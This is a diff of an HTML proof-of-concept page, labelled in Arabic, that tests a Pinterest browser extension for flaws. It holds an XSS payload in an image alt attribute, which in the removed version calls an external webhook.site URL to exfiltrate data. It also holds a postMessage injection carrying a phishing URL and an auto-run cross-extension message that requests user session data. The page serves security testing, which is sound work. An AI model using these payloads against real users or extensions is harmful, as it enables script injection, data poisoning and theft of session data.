@@ -1,84 +1,116 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research - Pinterest Extension PoC</title>
+    <title>Pinterest Security Audit - Local Results</title>
     <style>
-        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background: #f0f2f5; color: #1c1e21; }
-        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        h1 { color: #e60023; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .exploit-box { background: #fff4f4; border-left: 5px solid #e60023; padding: 15px; margin: 20px 0; }
-        .target-img { width: 300px; border-radius: 8px; cursor: pointer; border: 3px dashed #ccc; transition: 0.3s; }
-        .target-img:hover { border-color: #e60023; transform: scale(1.01); }
-        #status { font-family: monospace; background: #222; color: #0f0; padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; }
+        h1 { color: #e60023; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
+        
+        /* تصميم الصورة التوضيحية */
+        .test-area { background: #252525; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center; border: 1px solid #444; }
+        .target-img { width: 250px; border: 3px solid #e60023; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .target-img:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(230, 0, 35, 0.5); }
+
+        /* جدول النتائج */
+        .results-table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2d2d2d; border-radius: 8px; overflow: hidden; }
+        .results-table th, .results-table td { padding: 15px; text-align: right; border-bottom: 1px solid #444; }
+        .results-table th { background: #e60023; color: white; }
+        .status-success { color: #00ff00; font-weight: bold; }
+        .status-fail { color: #ff4444; }
+        .data-payload { font-family: monospace; background: #000; padding: 5px; color: #0f0; display: block; white-space: pre-wrap; font-size: 12px; }
+        
+        button { background: #e60023; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #ff1a3c; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Pinterest Extension Vulnerability Lab</h1>
-    <p>هذه الصفحة مصممة لاختبار الثغرات الأمنية في إضافة Pinterest (v6.12.0) وإرسال النتائج للتحقق.</p>
+    <h1>نتائج فحص اختراق إضافة Pinterest</h1>
 
-    <div class="exploit-box">
-        <h3>1. اختبار XSS via Image Metadata</h3>
-        <p>مرر الماوس فوق الصورة واضغط على زر Pinterest (إذا كان الكود مصاباً سيتم تنفيذ JavaScript).</p>
+    <div class="test-area">
+        <h3>منطقة اختبار الحقن (Injection Area)</h3>
+        <p>مرر الماوس فوق الصورة واضغط على زر Pinterest لاختبار سحب البيانات</p>
         <img src="https://picsum.photos/400/300" 
-             alt='"><img src=x onerror="fetch(`https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104?type=XSS_SUCCESS`)">' 
+             alt='"><img src=x onerror="window.printResult(`XSS_EXECUTION`, `تم تنفيذ كود داخل واجهة الإضافة!`)">' 
+             title="TEST_PAYLOAD_V1"
              class="target-img">
+        <br><br>
+        <button onclick="triggerPostMessage()">اختبار حقن رسائل PostMessage</button>
     </div>
 
-    <div class="exploit-box">
-        <h3>2. اختبار PostMessage Data Injection</h3>
-        <button onclick="triggerPostMessage()">تشغيل حقن البيانات (PostMessage)</button>
-    </div>
-
-    <div id="status">> جاهز للاختبار...</div>
+    <table class="results-table">
+        <thead>
+            <tr>
+                <th>نوع الثغرة</th>
+                <th>الحالة</th>
+                <th>البيانات المستخرجة / النتيجة</th>
+            </tr>
+        </thead>
+        <tbody id="results-body">
+            </tbody>
+    </table>
 </div>
 
 <script>
-    const WEBHOOK_URL = "https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104";
     const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";
-    const logDiv = document.getElementById('status');
 
-    function report(msg, data = {}) {
-        logDiv.innerHTML += `<br>> ${msg}`;
-        fetch(`${WEBHOOK_URL}?log=${encodeURIComponent(msg)}`, {
-            method: 'POST',
-            body: JSON.stringify(data)
-        });
-    }
+    // دالة لطباعة النتائج في الجدول بدلاً من الويب هوك
+    window.printResult = function(type, description, data = null) {
+        const tbody = document.getElementById('results-body');
+        const row = document.createElement('tr');
+        
+        let dataHtml = data ? `<code class="data-payload">${JSON.stringify(data, null, 2)}</code>` : description;
+        let statusClass = data || type.includes('SUCCESS') ? 'status-success' : 'status-fail';
+        let statusText = data || type.includes('SUCCESS') ? 'تمت الاستجابة' : 'لم يتم الرد';
 
-    // --- تجربة الثغرة 1: PostMessage Injection ---
+        row.innerHTML = `
+            <td><b>${type}</b></td>
+            <td class="${statusClass}">${statusText}</td>
+            <td>${dataHtml}</td>
+        `;
+        tbody.prepend(row); // إضافة النتيجة الجديدة في الأعلى
+    };
+
+    // 1. اختبار حقن PostMessage
     function triggerPostMessage() {
-        report("جاري محاولة حقن رسالة خبيثة عبر window.postMessage...");
+        printResult("PostMessage Injection", "جاري إرسال رسالة مفخخة للإضافة...");
         window.postMessage({
             type: "PINTEREST_SAVE",
             data: {
-                url: "https://evil-attacker.com/phishing",
+                url: "https://evil-site.com/phishing",
                 src: "https://picsum.photos/200/200",
-                description: "This data was injected via an external site!",
+                description: "DATA_POISONING_SUCCESS",
                 isThroughExtension: true
             }
         }, "*");
     }
 
-    // --- تجربة الثغرة 2: External Messaging (Cross-Extension) ---
-    async function testExternalMessaging() {
+    // 2. اختبار التواصل المباشر (Cross-Extension Messaging)
+    function testDirectMessage() {
         if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
-            report("محاولة التواصل المباشر مع Background Script...");
             chrome.runtime.sendMessage(EXTENSION_ID, { action: "FETCH_USER" }, (response) => {
                 if (chrome.runtime.lastError) {
-                    report("فشل الاتصال المباشر (قد تكون الحماية مفعلة): " + chrome.runtime.lastError.message);
+                    printResult("Direct Messaging", "فشل: " + chrome.runtime.lastError.message);
                 } else {
-                    report("نجاح! تم سحب بيانات المستخدم!", response);
+                    printResult("Direct Messaging SUCCESS", "تم سحب بيانات الجلسة!", response);
                 }
             });
         }
     }
 
-    // تشغيل الاختبارات التلقائية عند التحميل
+    // تشغيل الفحص التلقائي عند التحميل
     window.onload = () => {
-        testExternalMessaging();
+        testDirectMessage();
+        
+        // استماع للرسائل العائدة من الإضافة (إن وجدت)
+        window.addEventListener("message", (event) => {
+            if (event.data && event.data.type === "PINTEREST_SAVE_BACK") {
+                printResult("Extension Response", "الإضافة ردت على الرسالة المحقونة", event.data);
+            }
+        });
     };
 </script>
 
